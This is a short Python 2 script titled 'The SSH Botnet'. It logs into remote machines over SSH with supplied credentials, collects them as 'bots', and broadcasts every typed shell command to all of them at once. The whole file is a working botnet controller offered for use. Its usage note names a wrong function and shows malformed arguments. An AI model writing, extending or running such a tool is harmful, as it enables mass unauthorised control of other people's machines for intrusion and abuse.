from pexpect import pxssh
class Bot:
	def __init__(self, host, username, password):
		self.host = host
		self.username = username
		self.password = password
		self.session = self.ssh()
	def ssh(self):
		try:
			s = pxssh.pxssh()
			s.login(self.host, self.username, self.password)
			return s
		except:
			print("Connection Failed!")
	def send_command(self, comm):
		self.session.sendline(comm)
		self.session.prompt()
		return self.session.before

def botnet_command(command):
	for bot in botnet:
		output = bot.send_command(command)
		print bot.host + ":\n"
		print("\n" + output)
def add_bot(host, username, password):
	bot = Bot(host, username, password)
	botnet.append(bot)
botnet = []
def menu():
	print """
Welcome To The SSH Botnet!
Options:

1. Add Bot
2. Control your existing bots

Enter the number of the chosen option
"""
menu()
option = raw_input(">> ")
if option == "1":
	print """
[Note]

If you want to add MULTIPLE Bots to your botnet,
You will need to edit this file and add a line like this for EVERY new bot at the bottom:

add_bots(BOTS_IP_HERE, BOTS_USERNAME_HERE_ BOTS_PASSWORD_HERE)

"""
	ip = raw_input("Bot IP: ")
	uname = raw_input("Bot Username: ")
	passw = raw_input("Bot's SSH Login Password: ")
	add_bot(ip,uname,passw)
	while True:
		commandtosend = raw_input("$ ")
		botnet_command(commandtosend)
else:
	while True:
		inputtedcommand = raw_input("$ ")
		botnet_command(inputtedcommand)
